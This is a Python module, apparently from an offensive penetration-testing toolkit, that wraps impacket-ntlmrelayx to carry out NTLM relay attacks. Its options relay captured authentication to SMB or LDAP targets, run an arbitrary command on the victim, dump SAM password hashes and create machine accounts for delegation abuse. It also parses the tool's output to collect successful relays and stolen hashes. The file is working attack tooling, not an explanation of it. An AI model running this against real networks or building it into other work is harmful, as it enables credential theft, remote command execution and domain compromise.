#!/usr/bin/env python3
"""
ntlm_relay — NTLM relay attacks via impacket-ntlmrelayx.

CLI deps: impacket-ntlmrelayx (installed on Kali)

Relays NTLM authentication to other services (SMB, LDAP, HTTP).
Long-running process using Popen with duration limit.

REQUIRES: Root privileges.
"""

import json
import re
import time

from base_module import TacticalModule


class NTLMRelay(TacticalModule):
    name = "ntlm_relay"
    description = "NTLM relay attacks via impacket-ntlmrelayx"

    def _add_module_args(self) -> None:
        self.parser.add_argument("--targets", required=True, help="Target file or single target URL (smb://IP)")
        self.parser.add_argument("--smb-to-ldap", action="store_true", help="Relay SMB to LDAP (for delegation attacks)")
        self.parser.add_argument("--duration", type=int, default=120, help="Duration in seconds (default: 120)")
        self.parser.add_argument("--command", help="Command to execute on successful relay")
        self.parser.add_argument("--dump-sam", action="store_true", help="Dump SAM on successful SMB relay")
        self.parser.add_argument("--delegate-access", action="store_true", help="Create computer account for delegation")

    def run(self, args) -> None:
        if not self.check_root():
            return

        nr_args = ["-t", args.targets, "-smb2support"]

        if args.command:
            nr_args.extend(["-c", args.command])
        if args.dump_sam:
            nr_args.append("--dump-sam")
        if args.delegate_access:
            nr_args.append("--delegate-access")
        if args.smb_to_ldap:
            nr_args.extend(["-t", f"ldap://{args.targets.replace('smb://', '')}"])

        start = time.monotonic()
        stdout, stderr = self.run_tool_popen("impacket-ntlmrelayx", nr_args, duration=args.duration)
        duration_ms = int((time.monotonic() - start) * 1000)

        relayed = self._parse_output(stdout + stderr)

        self.log_run(args.db_path, self.name, json.dumps(vars(args), default=str),
                     0, stdout[:5000], stderr[:5000], duration_ms)
        self.output_success({
            "targets": args.targets, "relayed_connections": relayed,
            "relay_count": len(relayed), "duration_ms": duration_ms,
        })

    @staticmethod
    def _parse_output(output: str) -> list[dict]:
        relayed: list[dict] = []
        for line in output.split("\n"):
            if "authenticat" in line.lower() and ("success" in line.lower() or "[+]" in line):
                relayed.append({"info": line.strip()[:300]})
            elif "SAM" in line and ":" in line:
                relayed.append({"type": "sam_hash", "info": line.strip()[:300]})
        return relayed


if __name__ == "__main__":
    NTLMRelay().execute()
